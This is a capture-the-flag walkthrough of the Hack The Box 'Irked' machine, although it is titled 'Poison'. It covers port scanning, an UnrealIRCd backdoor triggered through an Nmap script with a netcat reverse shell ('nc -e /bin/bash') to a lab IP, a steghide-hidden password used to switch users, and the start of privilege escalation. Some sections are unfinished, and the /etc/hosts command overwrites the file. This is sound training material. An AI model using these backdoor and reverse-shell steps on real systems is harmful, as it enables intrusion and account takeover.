# Hack The Box - Poison Walkthrough w/o Metasploit

## Reconnaissance
Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Irked]
└─$ sudo nmap -sC -sV -O -oA nmap/initial 10.10.10.117
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-04 07:59 EST
Nmap scan report for 10.10.10.117
Host is up (0.12s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a5df5bdcf8378b675319bdc79c5fdad (DSA)
|   2048 752e66bfb93cccf77e848a8bf0810233 (RSA)
|   256 c8a3a25e349ac49b9053f750bfea253b (ECDSA)
|_  256 8d1b43c7d01a4c05cf82edc10163a20c (ED25519)
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          41998/tcp6  status
|   100024  1          43835/udp   status
|   100024  1          44500/tcp   status
|_  100024  1          46553/udp6  status
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=3/4%OT=22%CT=1%CU=40075%PV=Y%DS=2%DC=I%G=Y%TM=640340E4
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10A%TI=Z%CI=I%TS=8)SEQ(SP=10
OS:2%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3
OS:=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=7120%W2=7
OS:120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M53CNNSNW
OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.88 seconds
```

Before starting the enumeration, I wanted to check if any other ports were open, so I ran `rustscan` to quickly check if any other ports were open.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Irked]
└─$ rustscan 10.10.10.117 --range 1-65535
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.config/rustscan/config.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.10.117:22
Open 10.10.10.117:80
Open 10.10.10.117:111
Open 10.10.10.117:6697
Open 10.10.10.117:8067
Open 10.10.10.117:44500
Open 10.10.10.117:65534
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 22,80,111,6697,8067,44500,65534 10.10.10.117

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-04 08:04 EST
Initiating Ping Scan at 08:04
Scanning 10.10.10.117 [2 ports]
Completed Ping Scan at 08:04, 0.13s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 08:04
Completed Parallel DNS resolution of 1 host. at 08:04, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 08:04
Scanning 10.10.10.117 [7 ports]
Discovered open port 22/tcp on 10.10.10.117
Discovered open port 80/tcp on 10.10.10.117
Discovered open port 111/tcp on 10.10.10.117
Discovered open port 44500/tcp on 10.10.10.117
Discovered open port 8067/tcp on 10.10.10.117
Discovered open port 6697/tcp on 10.10.10.117
Discovered open port 65534/tcp on 10.10.10.117
Completed Connect Scan at 08:04, 0.13s elapsed (7 total ports)
Nmap scan report for 10.10.10.117
Host is up, received syn-ack (0.13s latency).
Scanned at 2023-03-04 08:04:08 EST for 0s

PORT      STATE SERVICE    REASON
22/tcp    open  ssh        syn-ack
80/tcp    open  http       syn-ack
111/tcp   open  rpcbind    syn-ack
6697/tcp  open  ircs-u     syn-ack
8067/tcp  open  infi-async syn-ack
44500/tcp open  unknown    syn-ack
65534/tcp open  unknown    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.30 seconds
```

Nmap result showed `3` open ports while Rustscan showed `7` open ports. So to confirm this I decided to run nmap full scan once again.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Irked]
└─$ nmap -sC -sV -p 22,80,1111,6697,8067,65534 -oA nmap/scripts 10.10.10.117

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-04 08:02 EST
Nmap scan report for 10.10.10.117
Host is up (0.13s latency).

PORT      STATE  SERVICE        VERSION
22/tcp    open   ssh            OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a5df5bdcf8378b675319bdc79c5fdad (DSA)
|   2048 752e66bfb93cccf77e848a8bf0810233 (RSA)
|   256 c8a3a25e349ac49b9053f750bfea253b (ECDSA)
|_  256 8d1b43c7d01a4c05cf82edc10163a20c (ED25519)
80/tcp    open   http           Apache httpd 2.4.10 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.10 (Debian)
1111/tcp  closed lmsocialserver
6697/tcp  open   irc            UnrealIRCd (Admin email djmardov@irked.htb)
8067/tcp  open   irc            UnrealIRCd (Admin email djmardov@irked.htb)
65534/tcp open   irc            UnrealIRCd (Admin email djmardov@irked.htb)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.18 seconds
```

The nmap scan also revealed the admin's email along with the host name.

So, I added the host's name into the `/etc/hosts` file.

```
echo "10.10.10.117  irked.htb" > /etc/hosts
```

## Enumeration
I started enumeration by visiting the website on port `80`. I



gobuster 
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Irked]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.117
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.117
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/03/04 08:13:18 Starting gobuster in directory enumeration mode
===============================================================
/manual               (Status: 301) [Size: 313] [--> http://10.10.10.117/manual/]
/server-status        (Status: 403) [Size: 300]
Progress: 220546 / 220561 (99.99%)
===============================================================
2023/03/04 09:00:34 Finished
===============================================================
```

vulnerable to backdoor

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Irked]
└─$ nmap -p 6697,8067,65534 --script irc-unrealircd-backdoor 10.10.10.117
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-04 09:13 EST
Nmap scan report for irked.htb (10.10.10.117)
Host is up (0.13s latency).

PORT      STATE SERVICE
6697/tcp  open  ircs-u
8067/tcp  open  infi-async
|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277
65534/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 18.34 seconds
                                                              
```


port vulnerable to nmap script

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Irked]
└─$ nmap -p 8067 --script=irc-unrealircd-backdoor --script-args=irc-unrealircd-backdoor.command="nc -e /bin/bash 10.10.14.30 4444"  10.10.10.117
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-04 09:28 EST
Nmap scan report for irked.htb (10.10.10.117)
Host is up (0.13s latency).

PORT     STATE SERVICE
8067/tcp open  infi-async
|_irc-unrealircd-backdoor: Server closed connection, possibly due to too many reconnects. Try again with argument irc-unrealircd-backdoor.wait set to 100 (or higher if you get this message again).

Nmap done: 1 IP address (1 host up) scanned in 22.93 second
```


shell
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Irked]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.30] from (UNKNOWN) [10.10.10.117] 39852
whoami
ircd
```


Grabbing user flag, but permission denied.

```
ircd@irked:/home/djmardov$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
```




backup file.
```
ircd@irked:/home/djmardov/Documents$ ls -la
ls -la
total 12
drwxr-xr-x  2 djmardov djmardov 4096 Sep  5 08:41 .
drwxr-xr-x 18 djmardov djmardov 4096 Sep  5 08:41 ..
-rw-r--r--  1 djmardov djmardov   52 May 16  2018 .backup
lrwxrwxrwx  1 root     root       23 Sep  5 08:16 user.txt -> /home/djmardov/user.txt
```

contents of backup
```
ircd@irked:/home/djmardov/Documents$ cat .backup
cat .backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

wget the file
```  
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Irked]
└─$ wget 10.10.10.117/irked.jpg
--2023-03-04 12:06:36--  http://10.10.10.117/irked.jpg
Connecting to 10.10.10.117:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 34697 (34K) [image/jpeg]
Saving to: ‘irked.jpg’

irked.jpg                                                                      100%[====================================================================================================================================================================================================>]  33.88K  --.-KB/s    in 0.1s    

2023-03-04 12:06:37 (260 KB/s) - ‘irked.jpg’ saved [34697/34697]
```

Using steghide to extract

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Irked]
└─$ steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
wrote extracted data to "pass.txt".

┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Irked]
└─$ cat pass.txt
Kab6h+m+bbp2J:HG
```

Pivoting to djmardov
```
ircd@irked:/home/djmardov/Documents$ su djmardov
su djmardov
Password: Kab6h+m+bbp2J:HG

djmardov@irked:~/Documents$ whoami
whoami
djmardov
```

grabbing user flag

```
djmardov@irked:~/Documents$ cat user.txt
cat user.txt
[REDACTED]
```


ssh into djmardov
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Irked]
└─$ ssh djmardov@10.10.10.117
The authenticity of host '10.10.10.117 (10.10.10.117)' can't be established.
ED25519 key fingerprint is SHA256:Ej828KWlDpyEOvOxHAspautgmarzw646NS31tX3puFg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.117' (ED25519) to the list of known hosts.
djmardov@10.10.10.117's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue May 15 08:56:32 2018 from 10.33.3.3
djmardov@irked:~$ 
```

## Privilege Escalation

Viewuser
```
djmardov@irked:~$ cd /usr/bin
djmardov@irked:/usr/bin$ viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2023-03-04 07:59 (:0)
djmardov pts/1        2023-03-04 12:09 (10.10.14.30)
sh: 1: /tmp/listusers: Permission denied
```


